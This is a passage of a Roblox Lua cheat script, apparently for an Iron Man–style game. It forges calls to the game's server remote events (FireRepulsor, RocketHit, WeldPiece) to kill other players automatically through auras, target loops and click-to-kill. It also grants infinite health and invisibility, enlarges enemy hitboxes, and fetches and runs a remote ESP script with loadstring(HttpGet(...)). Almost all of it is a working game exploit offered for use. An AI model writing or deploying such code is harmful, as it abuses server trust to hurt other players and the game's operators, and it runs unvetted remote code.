                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                
                local args = {
                    [1] = {
                        ["projectile"] = workspace.Effects.repulsorBeam,
                        ["hitPart"] = game.Players[boxtarget].Character.HumanoidRootPart,
                        ["hitPos"] = game.Players[boxtarget].Character.HumanoidRootPart.Position,
                        ["hitNormal"] = game.Players[boxtarget].Character.HumanoidRootPart.Position
                    }
                }
                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                local args = {
                    [1] = {
                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                    }
                }
                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))

                local args = {
                    [1] = {
                        ["projectile"] = workspace.Effects.repulsorBeam,
                        ["hitPart"] = game.Players[boxtarget].Character.HumanoidRootPart,
                        ["hitPos"] = game.Players[boxtarget].Character.HumanoidRootPart.Position,
                        ["hitNormal"] = game.Players[boxtarget].Character.HumanoidRootPart.Position
                    }
                }
                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                local args = {
                    [1] = {
                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                    }
                }
                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                local args = {
                    [1] = {
                        ["projectile"] = workspace.Effects.repulsorBeam,
                        ["hitPart"] = game.Players[boxtarget].Character.HumanoidRootPart,
                        ["hitPos"] = game.Players[boxtarget].Character.HumanoidRootPart.Position,
                        ["hitNormal"] = game.Players[boxtarget].Character.HumanoidRootPart.Position
                    }
                }
                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
            end
            if Rockets == true then
                local args = {
                    [1] = {
                        ["projectile"] = workspace.Effects.explosion,
                        ["hitPos"] = game.Players[boxtarget].Character.UpperTorso.Position,
                    }
                }
                
                game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                local args = {
                    [1] = {
                        ["projectile"] = workspace.Effects.explosion,
                        ["hitPos"] = game.Players[boxtarget].Character.UpperTorso.Position,
                    }
                }
                
                game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                local args = {
                    [1] = {
                        ["projectile"] = workspace.Effects.explosion,
                        ["hitPos"] = game.Players[boxtarget].Character.UpperTorso.Position,
                    }
                }
                
                game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                local args = {
                    [1] = {
                        ["projectile"] = workspace.Effects.explosion,
                        ["hitPos"] = game.Players[boxtarget].Character.UpperTorso.Position,
                    }
                }
                
                game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
            end            
        end)
    end)

    local value = false
    local Toggle3 = textboxes:AddToggle("Kill Sentry Users", {flag = "ksuser", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                for i,v in pairs(game.Players:GetChildren()) do
                    if v.Name ~= game.Players.LocalPlayer.Name then
                        if v.Character:FindFirstChild("Skeleton") then
                            if v.Character.Health == 0 then
                                return
                            end
                            if Repulsors == true then
                                local args = {
                                    [1] = {
                                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                                    }
                                }
                                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                    
                                local args = {
                                    [1] = {
                                        ["projectile"] = workspace.Effects.repulsorBeam,
                                        ["hitPart"] = v.Character.HumanoidRootPart,
                                        ["hitPos"] = v.Character.HumanoidRootPart.Position,
                                        ["hitNormal"] = v.Character.HumanoidRootPart.Position
                                    }
                                }
                                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                            end
                            if Rockets == true then
                                local args = {
                                    [1] = {
                                        ["projectile"] = workspace.Effects.explosion,
                                        ["hitPos"] = v.Character.UpperTorso.Position,
                                    }
                                }
                                
                                game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                                local args = {
                                    [1] = {
                                        ["projectile"] = workspace.Effects.explosion,
                                        ["hitPos"] = v.Character.UpperTorso.Position,
                                    }
                                }
                                
                                game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                            end
                        end
                    end
                end
            end)
        end
    end)

    local value = false
    local Toggle3 = textboxes:AddToggle("Kill Suit Users", {flag = "ksuser", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                for i,v in pairs(game.Players:GetChildren()) do
                    if v.Name ~= game.Players.LocalPlayer.Name then
                        if v.Character:FindFirstChild("Suit") then
                            if v.Character.Health == 0 then
                                return
                            end
                            if Repulsors == true then
                                local args = {
                                    [1] = {
                                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                                    }
                                }
                                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                    
                                local args = {
                                    [1] = {
                                        ["projectile"] = workspace.Effects.repulsorBeam,
                                        ["hitPart"] = v.Character.HumanoidRootPart,
                                        ["hitPos"] = v.Character.HumanoidRootPart.Position,
                                        ["hitNormal"] = v.Character.HumanoidRootPart.Position
                                    }
                                }
                                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                            end
                            if Rockets == true then
                                local args = {
                                    [1] = {
                                        ["projectile"] = workspace.Effects.explosion,
                                        ["hitPos"] = v.Character.UpperTorso.Position,
                                    }
                                }
                                
                                game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                                local args = {
                                    [1] = {
                                        ["projectile"] = workspace.Effects.explosion,
                                        ["hitPos"] = v.Character.UpperTorso.Position,
                                    }
                                }
                                
                                game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                            end
                        end
                    end
                end
            end)
        end
    end)

    local value = false
    local Toggle3 = textboxes:AddToggle("Kill Non Suit Users", {flag = "knsuser", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                for i,v in pairs(game.Players:GetChildren()) do
                    if v.Name ~= game.Players.LocalPlayer.Name then
                        if not v.Character:FindFirstChild("Suit") then
                            if v.Character.Health == 0 then
                                return
                            end
                            if Repulsors == true then
                                local args = {
                                    [1] = {
                                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                                    }
                                }
                                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                    
                                local args = {
                                    [1] = {
                                        ["projectile"] = workspace.Effects.repulsorBeam,
                                        ["hitPart"] = v.Character.HumanoidRootPart,
                                        ["hitPos"] = v.Character.HumanoidRootPart.Position,
                                        ["hitNormal"] = v.Character.HumanoidRootPart.Position
                                    }
                                }
                                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                            end
                            if Rockets == true then
                                local args = {
                                    [1] = {
                                        ["projectile"] = workspace.Effects.explosion,
                                        ["hitPos"] = v.Character.UpperTorso.Position,
                                    }
                                }
                                
                                game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                                local args = {
                                    [1] = {
                                        ["projectile"] = workspace.Effects.explosion,
                                        ["hitPos"] = v.Character.UpperTorso.Position,
                                    }
                                }
                                
                                game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                            end
                        end
                    end
                end
            end)
        end
    end)

    textboxes:AddDropdown("Kill Method", {"Repulsors", "Rockets", "Both"}, {default = true}, function(asda)
        pcall(function()

            if asda == "Repulsors" then
                Repulsors = true
                Rockets = false
            end

            if asda == "Rockets" then
                Rockets = true
                Repulsors = false
            end

            if asda == "Both" then
                Rockets = true
                Repulsors = true
            end

        end)
    end)

    local value = false
    local Toggle = pee:AddToggle("Loop-Ground Crack", {flag = "lcrack", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    g:Disconnect()
                end
                game:GetService("ReplicatedStorage").Events.GroundCrack:FireServer()
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("Safezone on Low Health", {flag = "lcrack", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    g:Disconnect()
                end
                if game.Players.LocalPlayer.Character.Humanoid.Health < 9 then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3795, 16563, -290)
                    wait(1)
                    game.Players.LocalPlayer.Character.Humanoid.Health = 10
                    local AutoRefresh = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                    for _, v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
                        if v:IsA("MeshPart") then
                            v:Destroy()
                        end
                    end
                    game:GetService("Players").LocalPlayer.Character.Humanoid:Destroy()
                    wait(5.7)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(AutoRefresh)   
                end
            end)
        end
    end)

    local UniBeamToggle = false
    local Toggle3 = pee:AddToggle("Hold T To Explode", {flag = "exkeylaser", default = false}, function(s)
        UniBeamToggle = s
    end)

    spawn(function()
        local KeyDown = false
        function laser()
        game:service('RunService').Stepped:connect(function(s)
        if KeyDown == true then
        if UniBeamToggle == true then
            local args = {
                [1] = {
                    ["projectile"] = workspace.Effects.explosion,
                    ["hitPos"] = game.Players.LocalPlayer:GetMouse().hit.p,
                }
            }
            
            game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
            local args = {
                [1] = {
                    ["projectile"] = workspace.Effects.explosion,
                    ["hitPos"] = game.Players.LocalPlayer:GetMouse().hit.p,
                }
            }
            
            game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
            local args = {
                [1] = {
                    ["projectile"] = workspace.Effects.explosion,
                    ["hitPos"] = game.Players.LocalPlayer:GetMouse().hit.p,
                }
            }
            
            game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
        end
        end
        end)
        end
        local x = 0
        local me = game.Players.LocalPlayer.Name
        local mouse = game.Players.LocalPlayer:GetMouse()
        mouse.KeyDown:connect(function (key)
        if(key:byte() == 116) then
        KeyDown = true;
        Player = game:GetService("Players").LocalPlayer.Name
        AnimationId = "1746432470"
        local Anim = Instance.new("Animation")
        Anim.AnimationId = "rbxassetid://"..AnimationId
        local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
        if UniBeamToggle == true then
        k:Play() 
        k:AdjustSpeed(1)
        end
        if x ~= 1 then
            laser()
            x = x +1
        end
        while wait() do
            if KeyDown == false then
                k:Stop()
                end
            end
        end
        end)
        mouse.KeyUp:connect(function (key)
        if(key:byte() == 116) then
        KeyDown = false;
        end
        end)
    end)

    local value = false
    local Button = pee:AddButton("Infinite HP", function(s)
        local g
        g = game:service('RunService').Stepped:connect(function()
            if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
                return g:Disconnect()
            end
            local Event = game:GetService("ReplicatedStorage").Events.WeldPiece
            Event:FireServer(game:GetService("Workspace")[game.Players.LocalPlayer.Name].Suit.LowerTorso.Main, game:GetService("Workspace")[game.Players.LocalPlayer.Name].LowerTorso)
            Event:FireServer(game:GetService("Workspace")[game.Players.LocalPlayer.Name].Suit.UpperTorso.Main, game:GetService("Workspace")[game.Players.LocalPlayer.Name].UpperTorso)
        end)
    end)

    local clickbeam = false
    local Toggle = click:AddToggle("Click Beam", {flag = "cbeam", default = false}, function(s)
        clickbeam = s
        if s then
            if not clickbeam then
                return
            end
            while clickbeam do
                wait()
                local p,cd,cam = game:service('Players').LocalPlayer,math.huge,workspace.CurrentCamera
                local mouse = p:GetMouse()
                mouse.Button1Down:connect(function()
                    if clickbeam == true then
                        for a,v in next, game:service('Players'):GetChildren() do
                            if v ~= p then
                                pcall(function()
                                    local a,a2 = cam:WorldToScreenPoint(v.Character.PrimaryPart.Position)
                                    if a2 then 
                                        local dist = (Vector2.new(a.X,a.Y)-Vector2.new(mouse.X,mouse.Y)).magnitude
                                        if dist < _G.volume then
                                            local g
                                            g = game:service('RunService').Stepped:connect(function()
                                                if v.Character.Humanoid.Health == 0 then
                                                    return g:Disconnect()
                                                end
                                                local args = {
                                                    [1] = {
                                                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                                
                                                local args = {
                                                    [1] = {
                                                        ["projectile"] = workspace.Effects.repulsorBeam,
                                                        ["hitPart"] = v.Character.HumanoidRootPart,
                                                        ["hitPos"] = v.Character.HumanoidRootPart.Position,
                                                        ["hitNormal"] = v.Character.HumanoidRootPart.Position
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                                                local args = {
                                                    [1] = {
                                                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                                
                                                local args = {
                                                    [1] = {
                                                        ["projectile"] = workspace.Effects.repulsorBeam,
                                                        ["hitPart"] = v.Character.HumanoidRootPart,
                                                        ["hitPos"] = v.Character.HumanoidRootPart.Position,
                                                        ["hitNormal"] = v.Character.HumanoidRootPart.Position
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                                                local args = {
                                                    [1] = {
                                                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                                
                                                local args = {
                                                    [1] = {
                                                        ["projectile"] = workspace.Effects.repulsorBeam,
                                                        ["hitPart"] = v.Character.HumanoidRootPart,
                                                        ["hitPos"] = v.Character.HumanoidRootPart.Position,
                                                        ["hitNormal"] = v.Character.HumanoidRootPart.Position
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                                                local args = {
                                                    [1] = {
                                                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                                
                                                local args = {
                                                    [1] = {
                                                        ["projectile"] = workspace.Effects.repulsorBeam,
                                                        ["hitPart"] = v.Character.HumanoidRootPart,
                                                        ["hitPos"] = v.Character.HumanoidRootPart.Position,
                                                        ["hitNormal"] = v.Character.HumanoidRootPart.Position
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                                                local args = {
                                                    [1] = {
                                                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                                
                                                local args = {
                                                    [1] = {
                                                        ["projectile"] = workspace.Effects.repulsorBeam,
                                                        ["hitPart"] = v.Character.HumanoidRootPart,
                                                        ["hitPos"] = v.Character.HumanoidRootPart.Position,
                                                        ["hitNormal"] = v.Character.HumanoidRootPart.Position
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                                                local args = {
                                                    [1] = {
                                                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                                
                                                local args = {
                                                    [1] = {
                                                        ["projectile"] = workspace.Effects.repulsorBeam,
                                                        ["hitPart"] = v.Character.HumanoidRootPart,
                                                        ["hitPos"] = v.Character.HumanoidRootPart.Position,
                                                        ["hitNormal"] = v.Character.HumanoidRootPart.Position
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                                                local args = {
                                                    [1] = {
                                                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                                
                                                local args = {
                                                    [1] = {
                                                        ["projectile"] = workspace.Effects.repulsorBeam,
                                                        ["hitPart"] = v.Character.HumanoidRootPart,
                                                        ["hitPos"] = v.Character.HumanoidRootPart.Position,
                                                        ["hitNormal"] = v.Character.HumanoidRootPart.Position
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                                                local args = {
                                                    [1] = {
                                                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                                
                                                local args = {
                                                    [1] = {
                                                        ["projectile"] = workspace.Effects.repulsorBeam,
                                                        ["hitPart"] = v.Character.HumanoidRootPart,
                                                        ["hitPos"] = v.Character.HumanoidRootPart.Position,
                                                        ["hitNormal"] = v.Character.HumanoidRootPart.Position
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                                                local args = {
                                                    [1] = {
                                                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                                
                                                local args = {
                                                    [1] = {
                                                        ["projectile"] = workspace.Effects.repulsorBeam,
                                                        ["hitPart"] = v.Character.HumanoidRootPart,
                                                        ["hitPos"] = v.Character.HumanoidRootPart.Position,
                                                        ["hitNormal"] = v.Character.HumanoidRootPart.Position
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                                            end)
                                        end
                                    end
                                end)
                            end
                        end
                    end
                end)
                return
            end
        end
    end)

    local clickbeam = false
    local Toggle = click:AddToggle("Click Rocket", {flag = "cbeam", default = false}, function(s)
        clickbeam = s
        if s then
            if not clickbeam then
                return
            end
            while clickbeam do
                wait()
                local p,cd,cam = game:service('Players').LocalPlayer,math.huge,workspace.CurrentCamera
                local mouse = p:GetMouse()
                mouse.Button1Down:connect(function()
                    if clickbeam == true then
                        for a,v in next, game:service('Players'):GetChildren() do
                            if v ~= p then
                                pcall(function()
                                    local a,a2 = cam:WorldToScreenPoint(v.Character.PrimaryPart.Position)
                                    if a2 then 
                                        local dist = (Vector2.new(a.X,a.Y)-Vector2.new(mouse.X,mouse.Y)).magnitude
                                        if dist < _G.volume then
                                            local g
                                            g = game:service('RunService').Stepped:connect(function()
                                                if v.Character.Humanoid.Health == 0 then
                                                    return g:Disconnect()
                                                end
                                                local args = {
                                                    [1] = {
                                                        ["projectile"] = workspace.Effects.explosion,
                                                        ["hitPos"] = v.Character.UpperTorso.Position,
                                                    }
                                                }
                                                
                                                game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                                                local args = {
                                                    [1] = {
                                                        ["projectile"] = workspace.Effects.explosion,
                                                        ["hitPos"] = v.Character.UpperTorso.Position,
                                                    }
                                                }
                                                
                                                game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                                            end)
                                        end
                                    end
                                end)
                            end
                        end
                    end
                end)
                return
            end
        end
    end)

    local ClickCircle = Drawing.new('Circle')
    ClickCircle.Radius = 90
    ClickCircle.Filled = false
    ClickCircle.NumSides = 200
    ClickCircle.Transparency = 0.5
    ClickCircle.Color = Color3.new(1,1,1)
    local value = false
    local Toggle = click:AddToggle("FOV Circle", {flag = "fovc", default = false}, function(s)
        value = s
        if not value then
            ClickCircle.Visible = false
            return
        end
        if s then
            ClickCircle.Thickness = 2.7
            ClickCircle.Visible = true
            local player = game:service('Players').LocalPlayer 
            local mouse = player:GetMouse()
            mouse.Move:connect(function()
                ClickCircle.Position = Vector2.new(mouse.X,mouse.Y+35)
            end)
        end
    end)

    _G.volume = 90
    local Slider = click:AddSlider("FOV Size", 10, 200, 90, {toggleable = false, default = false, flag = "slider1", fireontoggle = true, fireondrag = true, rounded = true}, function(val, bool)
        _G.volume = val
        ClickCircle.Radius = val
    end)

    local value = false
    local Toggle = click:AddToggle("Fill FOV Circle", {flag = "fcircle", default = false}, function(s)
        value = s
        if not value then
            ClickCircle.Filled = false
            return
        end
        if s then
            ClickCircle.Filled = true
        end
    end)

    local Picker = click:AddPicker("Color", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        ClickCircle.Color = color
    end)

    local size = 5
    local snapaura = false
    local Toggle = aura:AddToggle("Beam Aura", {flag = "baura", default = false}, function(s)
        snapaura = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not snapaura then
                    g:Disconnect()
                end
                if snapaura == true then
                    for i,v in pairs(game.Players:GetPlayers()) do
                        if v ~= game.Players.LocalPlayer then
                            pcall(function()
                                if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= size then
                                    local args = {
                                        [1] = {
                                            ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                                        }
                                    }
                                    game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                    
                                    local args = {
                                        [1] = {
                                            ["projectile"] = workspace.Effects.repulsorBeam,
                                            ["hitPart"] = v.Character.HumanoidRootPart,
                                            ["hitPos"] = v.Character.HumanoidRootPart.Position,
                                            ["hitNormal"] = v.Character.HumanoidRootPart.Position
                                        }
                                    }
                                    game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                                end
                            end)
                        end
                    end
                end
            end)
        end
    end)

    local size2 = 25
    local snapaura = false
    local Target = nil
    local Toggle = aura:AddToggle("Hit Back", {flag = "paura", default = false}, function(s)
        snapaura = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not snapaura then
                    g:Disconnect()
                end
                if snapaura == true then
                    for i,v in pairs(game.Players:GetPlayers()) do
                        if v ~= game.Players.LocalPlayer then
                            pcall(function()
                                if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= size2 then
                                    if game.Players.LocalPlayer.Character.HumanoidRootPart.punchHit then
                                        local args = {
                                            [1] = {
                                                ["projectile"] = workspace.Effects.explosion,
                                                ["hitPos"] = v.Character.UpperTorso.Position,
                                            }
                                        }
                                        
                                        game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                                        local args = {
                                            [1] = {
                                                ["projectile"] = workspace.Effects.explosion,
                                                ["hitPos"] = v.Character.UpperTorso.Position,
                                            }
                                        }
                                        
                                        game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))                            
                                    end
                                end
                            end)
                        end
                    end
                end
            end)
        end
    end)

    local size2 = 5
    local snapaura = false
    local Toggle = aura:AddToggle("Rocket Aura", {flag = "raura", default = false}, function(s)
        snapaura = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not snapaura then
                    g:Disconnect()
                end
                if snapaura == true then
                    for i,v in pairs(game.Players:GetPlayers()) do
                        if v ~= game.Players.LocalPlayer then
                            pcall(function()
                                if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= size2 then
                                    local args = {
                                        [1] = {
                                            ["projectile"] = workspace.Effects.explosion,
                                            ["hitPos"] = v.Character.UpperTorso.Position,
                                        }
                                    }
                                    
                                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                                    local args = {
                                        [1] = {
                                            ["projectile"] = workspace.Effects.explosion,
                                            ["hitPos"] = v.Character.UpperTorso.Position,
                                        }
                                    }
                                    
                                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                                end
                            end)
                        end
                    end
                end
            end)
        end
    end)

    local Slider = aura:AddSlider("Aura Size", 5, 500, 5, {toggleable = false, default = false, flag = "asize", fireontoggle = true, fireondrag = true, rounded = true}, function(val, bool)
        size = val
        size2 = val
    end)

    local part = Instance.new("Part")
    part.Transparency = 0.9
    part.Shape = "Block"
    part.Anchored = true
    part.CanCollide = true
    part.Parent = workspace
    part.Size = Vector3.new(100, 3, 100)
    part.Position = Vector3.new(-3781, 16492, -308)

    local savepos = nil
    local Button = plr:AddButton("Safe-Zone", function()
        savepos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
        safezone()
    end)

    local Button = plr:AddButton("Teleport Back", function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(savepos)
    end)

    local value = false
    local Toggle3 = plr:AddToggle("Anti Fling", {flag = "afling", default = false}, function(s)
        value = s
        if s then
            local g = game:service('RunService').Stepped:connect(function(s)
                if not value then
                    return g:Disconnect()
                end
                local lpc = game:GetService("Players").LocalPlayer.Character
                local val = 0
                for _, v in pairs(lpc.HumanoidRootPart:GetChildren()) do
                    if v:IsA("BodyAngularVelocity") then
                        v.MaxTorque = Vector3.new(val,val,val)
                        v:Destroy()
                    else
                        lpc.Humanoid.Sit = false
                        lpc.Humanoid.PlatformStand = false
                    end
                    if v:IsA("BodyVelocity") then
                        v.MaxForce = Vector3.new(val,val,val)
                        v:Destroy()
                    else
                        lpc.Humanoid.Sit = false
                        lpc.Humanoid.PlatformStand = false
                    end
                end
                if lpc["HumanoidRootPart"]:FindFirstChild("SUPER_FLING") then
                    lpc["HumanoidRootPart"]:FindFirstChild("SUPER_FLING"):Destroy()
                elseif lpc["HumanoidRootPart"]:FindFirstChild("BFRC") then
                    lpc["HumanoidRootPart"]:FindFirstChild("BFRC"):Destroy()
                elseif lpc["HumanoidRootPart"]:FindFirstChild("BodyVelocity").MaxForce == "inf, inf, inf" then
                    lpc["HumanoidRootPart"]:FindFirstChild("BodyVelocity"):Destroy()
                elseif lpc["HumanoidRootPart"]:FindFirstChild("ParticleEmitter") then
                    lpc["HumanoidRootPart"]:FindFirstChild("ParticleEmitter"):Destroy()
                end
                end)
            end
    end)

    local value = false
    local Toggle3 = plr:AddToggle("No Ragdoll", {flag = "afling", default = false}, function(s)
        value = s
        if s then
            local g = game:service('RunService').Stepped:connect(function(s)
                if not value then
                    return g:Disconnect()
                end
                game.Players.LocalPlayer.Character.RagdollConstraints:Destroy()
            end)
        end
    end)

    local value = false
    local Toggle3 = plr:AddToggle("No Fall Damage", {flag = "skydive", default = false}, function(s)
        value = s
        if s then
            local g = game:service('RunService').Stepped:connect(function(s)
                if not value then
                    return g:Disconnect()
                end
                game.Players.LocalPlayer.Character:FindFirstChild("Skydive"):Destroy()
            end)
        end
    end)

    local ESP = loadstring(game:HttpGet("https://kiriot22.com/releases/ESP.lua"))()

    ESP.Players = true
    ESP.Boxes = false
    ESP.Tracers = false
    ESP.Names = false
    ESP:Toggle(true)

    ESP:AddObjectListener(Workspace, {
        Name = "",
        CustomName = "",
        Color = Color3.fromRGB(0, 0, 0),
        IsEnabled = "whatever"
    })
    ESP.whatever = true

    local Toggle = esp:AddToggle("Name ESP", {flag = "Toggle_Flag", default = false}, function(asdw)
        pcall(function()
            if asdw == true then
                ESP.Names = true
            else
                ESP.Names = false
            end
        end)
    end)

    local Toggle = esp:AddToggle("Boxes", {flag = "Toggle_Flag", default = false}, function(asdw)
        pcall(function()
            if asdw == true then
                ESP.Boxes = true
            else
                ESP.Boxes = false
            end
        end)
    end)

    local Toggle = esp:AddToggle("Tracers", {flag = "Toggle_Flag", default = false}, function(asdw)
        pcall(function()
            if asdw == true then
                ESP.Tracers = true
            else
                ESP.Tracers = false
            end
        end)
    end)

    local Picker = esp:AddPicker("Color", {color = Color3.fromRGB(255, 0, 0)}, function(color)
        ESP.Color = color
    end)

    local size3 = 10
    local value = false
    local Toggle = hit:AddToggle("HitBox Visibility", {flag = "hbox", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function(s)
                if not value then
                    for i,v in pairs(game.Players:GetChildren()) do
                        if v.Name ~= game.Players.LocalPlayer.Name then
                            v.Character.HumanoidRootPart.Size = Vector3.new(2, 2, 1)
                            v.Character.HumanoidRootPart.Transparency = 1
                        end
                    end
                    return d:Disconnect()
                end
                if s then
                    for i,v in pairs(game.Players:GetChildren()) do
                        if v.Name ~= game.Players.LocalPlayer.Name then
                            v.Character.HumanoidRootPart.Size = Vector3.new(size3, size3, size3)
                            v.Character.HumanoidRootPart.Transparency = 0.5
                            v.Character.HumanoidRootPart.CanCollide = false
                            v.Character.HumanoidRootPart.Material = "SmoothPlastic"
                        end
                    end
                end
            end)
        end
    end)

    local Slider = hit:AddSlider("HitBox Size", 5, 100, 10, {toggleable = false, default = false, flag = "hitslider", fireontoggle = true, fireondrag = true, rounded = true}, function(val, bool)
        size3 = val
    end)

    local Button = invis:AddButton("Invisible", function()
        local Player   = game:GetService('Players').LocalPlayer

        local function RigType()
            if Player.Character then
                local Humanoid = Player.Character:WaitForChild('Humanoid')
                if Humanoid.RigType == Enum.HumanoidRigType.R15 then
                    return 'R15'
                else
                    return 'R6'
                end
            end
        end

        local function Invis()
            local Character = Player.Character
            local StoredCF = Character.PrimaryPart.CFrame
            local Part = Instance.new('Part',workspace)
            Part.Size = Vector3.new(5,0,5)
            Part.Anchored = true
            Part.CFrame = CFrame.new(Vector3.new(9999,9999,9999))
            Character.PrimaryPart.CFrame = Part.CFrame*CFrame.new(0,3,0)
            spawn(function()
                wait(3)
                Part:Destroy()
            end)
            if RigType() == 'R6' then
                local Clone = Character.HumanoidRootPart:Clone()
                Character.HumanoidRootPart:Destroy()
                Clone.Parent = Character
            else
                local Clone = Character.LowerTorso.Root:Clone()
                Character.LowerTorso.Root:Destroy()
                Clone.Parent = Character.LowerTorso
            end
            wait(1)
            Character.PrimaryPart.CFrame = StoredCF
        end

        Invis()
    end)

    local Label = chat:AddLabel("<> Beam <name>")

